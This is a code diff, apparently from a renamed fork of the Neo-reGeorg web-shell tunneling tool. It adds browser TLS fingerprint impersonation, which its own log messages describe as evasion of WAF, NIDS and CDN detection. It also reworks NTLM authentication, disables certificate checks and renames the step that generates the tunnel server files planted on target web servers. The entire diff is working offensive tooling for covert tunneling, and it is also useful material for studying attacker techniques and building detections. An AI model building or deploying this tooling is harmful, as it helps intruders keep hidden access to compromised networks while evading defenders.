+        # curl_cffi impersonation gives a coherent JA3/JA4/HTTP2/header-order
+        # fingerprint of a real browser. If curl_cffi is missing, or the user
+        # explicitly opts out with --impersonate off, we fall back to the
+        # standard requests transport (python-requests fingerprint).
+        IMPERSONATE = args.impersonate if using_curl_cffi else 'off'
+
+        if not using_curl_cffi and args.impersonate != 'off':
+            log.error("[!] curl_cffi is not installed - TLS/HTTP fingerprint evasion DISABLED.")
+            log.error("[!] Traffic will match python-requests fingerprint (detectable by WAF/NIDS/CDN).")
+            log.error("[!] Install with: pip install -r requirements.txt")
+
+        # NTLM auth via environment variables or --ntlm-auth
+        ntlm_user = NTLM_USER
+        ntlm_pass = NTLM_PASS
+        if hasattr(args, 'ntlm_auth') and args.ntlm_auth and ':' in args.ntlm_auth:
+            ntlm_user, ntlm_pass = args.ntlm_auth.split(':', 1)
+
+        # HttpNtlmAuth is a `requests` auth handler; not compatible with a
+        # curl_cffi Session. Force impersonation off so NTLM keeps working.
+        if IMPERSONATE != 'off' and ntlm_user and ntlm_pass:
+            log.warning("[!] NTLM authentication is incompatible with TLS impersonation.")
+            log.warning("[!] Disabling impersonation (traffic will match python-requests fingerprint).")
+            IMPERSONATE = 'off'
 
         print(separation)
 
 
         try:
-            conn = requests.Session()
+            if using_curl_cffi and IMPERSONATE != 'off':
+                conn = requests.Session(impersonate=IMPERSONATE)
+                log.info("[TLS] Impersonating: %s (JA3/JA4/HTTP2 fingerprint)" % IMPERSONATE)
+            else:
+                conn = requests.Session()
+                log.info("[TLS] Impersonation: disabled (python-requests fingerprint)")
+
             conn.proxies = PROXY
             conn.verify = False
             conn.headers['Accept-Encoding'] = 'gzip, deflate'
-            conn.headers['User-Agent'] = USERAGENT
 
-            # NTLM authentication support via environment variables or --ntlm-auth
-            ntlm_user = NTLM_USER
-            ntlm_pass = NTLM_PASS
-            if hasattr(args, 'ntlm_auth') and args.ntlm_auth:
-                # Support --ntlm-auth USER:PASS or DOMAIN\USER:PASS
-                if ':' in args.ntlm_auth:
-                    ntlm_user, ntlm_pass = args.ntlm_auth.split(':', 1)
+            # Only set our own User-Agent when NOT impersonating. curl_cffi
+            # sets a UA that matches the chosen browser profile so JA3/UA
+            # stay coherent; overriding here would break that coherence.
+            if IMPERSONATE == 'off':
+                conn.headers['User-Agent'] = USERAGENT
+
             if ntlm_user and ntlm_pass:
                 if not has_ntlm:
                     log.error("[NTLM] requests_ntlm is not installed. NTLM authentication will not work.")
@@ -958,7 +1042,7 @@ if __name__ == '__main__':
                     conn.proxies['https'] = PROXY['http']
 
             servSock_start = False
-            askNeoGeorg(conn, urls, redirect_urls, args.force_redirect)
+            askPugGeorg(conn, urls, redirect_urls, args.force_redirect)
 
             if 'Content-type' not in HEADERS:
                 HEADERS['Content-type'] = 'application/octet-stream'
@@ -1008,7 +1092,7 @@ if __name__ == '__main__':
             if servSock_start:
                 servSock.close()
     else:
-        # neoreg server generate
+        # pugreg server generate
         print(banner)
         READBUF = args.read_buff
         MAXREADSIZE = args.max_read_size * 1024
@@ -1029,7 +1113,7 @@ if __name__ == '__main__':
                 M_BASE64ARRAY.append(-1)
 
         script_dir = os.path.join(ROOT, 'templates')
-        print("    [+] Create neoreg server files:")
+        print("    [+] Create pugreg server files:")
 
         if args.file:
             http_get_content = file_read(args.file)
@@ -1038,10 +1122,10 @@ if __name__ == '__main__':
 
         if ispython3:
             http_get_content = http_get_content.encode()
-        neoreg_hello = base64.b64encode(http_get_content)
+        pugreg_hello = base64.b64encode(http_get_content)
         if ispython3:
-            neoreg_hello = neoreg_hello.decode()
-        neoreg_hello = neoreg_hello.translate(EncodeMap)
+            pugreg_hello = pugreg_hello.decode()
+        pugreg_hello = pugreg_hello.translate(EncodeMap)
 
         request_template_start_index = 0
         request_template_end_index = 0
@@ -1057,7 +1141,7 @@ if __name__ == '__main__':
             filepath = os.path.join(script_dir, filename)
             if os.path.isfile(filepath) and filename.startswith('tunnel.'):
                 text = file_read(filepath)
-                text = text.replace(r"NeoGeorg says, 'All seems fine'", neoreg_hello)
+                text = text.replace(r"PugGeorg says, 'Endpoint ready'", pugreg_hello)
                 text = re.sub(r"BASE64 CHARSLIST", M_BASE64CHARS, text)
                 text = re.sub(r"\bHTTPCODE\b", str(args.httpcode), text)
                 text = re.sub(r"\bREADBUF\b", str(READBUF), text)
